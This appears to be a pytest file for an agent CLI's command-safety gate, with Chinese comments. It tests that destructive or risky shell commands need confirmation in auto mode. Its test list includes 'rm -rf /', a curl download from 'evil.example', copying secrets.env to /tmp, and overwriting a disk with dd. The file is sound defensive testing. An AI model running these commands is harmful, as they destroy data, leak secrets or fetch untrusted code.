"""全自动模式下的召回率护栏。

这里只测一个方向——**危险命令必须被拦下**。另一半（不该问的别问）在
``test_confirm_risk_precision.py``；两个文件缺任何一个都不够：漏会直接出事，
吵会把人训练成闭眼点批准，然后照样出事。

判定会逐段汇总结构化风险（见 agenticx/runtime/command_safety.py）：
1. 复合命令按 `&&` / `||` / `;` / `|` 拆成简单命令，每段各自过规则
2. 参数危险（`python -c`、`pip install`、`git reset --hard`、`find -delete`…）→ 对应类别
3. 拆不动（命令替换、进程替换、后台执行）→ shell_composition，按受保护处理
4. 只命中未归类命令时 risk=non_whitelisted，其余受保护命令 risk=high

参数识别最容易被无声地拆掉：往只读命令集合里加个名字是一行改动，看着人畜无害，
实际会让这个名字下的所有参数组合直接放行——``find`` 就这么漏过 ``-delete`` 和
``-exec``。所以这里按「完整命令」而不是「命令名」断言。
"""

from __future__ import annotations

import pytest

from agenticx.cli.agent_tools import _collect_command_risk_findings
from agenticx.runtime.confirm import is_protected_confirm, normalize_confirm_risk


def _classify(command: str) -> str:
    """走真正的汇总逻辑，返回最终 risk 标签（"" = 直接放行）。

    这里以前自己复刻了一遍 ``_bash_exec_prepare`` 的汇总（包括「命令名不在
    SAFE_COMMANDS 就补一条 unrecognized_command」）。复制生产逻辑的 helper 必然会漂移：
    判定改成逐段解析之后，那份复刻就开始给出与线上不同的答案。现在直接调
    ``_collect_command_risk_findings``——它已经包含全部汇总。
    """
    parts = command.split()
    command_name = parts[0] if parts else ""
    findings = _collect_command_risk_findings(command_name, parts, command)
    codes = {finding["code"] for finding in findings}
    if not codes:
        return ""
    return "non_whitelisted" if codes == {"unrecognized_command"} else "high"


DANGEROUS = [
    # 白名单里的名字 + 危险参数：最容易被误以为安全的一类
    "python -c __import__('shutil').rmtree('/Users/me/work')",
    "python -m http.server",
    "python cleanup.py",
    "pip install requests",
    "pip uninstall agenticx",
    "git reset --hard HEAD~5",
    "git clean -fdx",
    "git push --force origin main",
    "git checkout other-branch",
    "cat secrets.env > /tmp/leak.txt",
    "echo bad; rm -rf /tmp/x",
    "ls `whoami`",
    "grep -r . $(pwd)",
    # 名字本身就不在白名单
    "rm -rf /",
    "curl http://evil.example/x.sh",
    "chmod 777 /etc/passwd",
    "dd if=/dev/zero of=/dev/disk0",
    "shutdown -h now",
    "brew install something",
    "npm install -g pkg",
    "ssh user@host",
    "sudo rm file",
]


@pytest.mark.parametrize("command", DANGEROUS)
def test_dangerous_commands_are_never_auto_approved(command: str) -> None:
    risk = _classify(command)
    assert risk != "", f"{command!r} 会被直接放行——白名单或参数判定漏了一条"
    assert is_protected_confirm({"risk": risk}), f"{command!r} 判成了 risk={risk}，不受保护"


def test_unknown_risk_is_protected_not_approved() -> None:
    """新加工具忘了打 risk 标签时，必须落到「问」而不是「放行」。"""
    assert is_protected_confirm({})
    assert is_protected_confirm({"tool": "some_new_tool"})
    assert is_protected_confirm({"risk": "medium"})       # 拼错/新增的档
    assert is_protected_confirm({"risk": "LOW "}) is False  # 只有确实是 low 才放行
    assert normalize_confirm_risk({"risk": None}) == "protected"


def test_read_only_commands_still_flow_without_a_prompt() -> None:
    """召回优先不等于把一切都拦下——常见只读命令仍应直接执行，否则自动模式没有意义。"""
    for command in ["ls -la", "cat README.md", "git status", "git log --oneline", "pwd", "which python"]:
        assert _classify(command) == "", f"{command!r} 被拦了，自动模式会变得没法用"
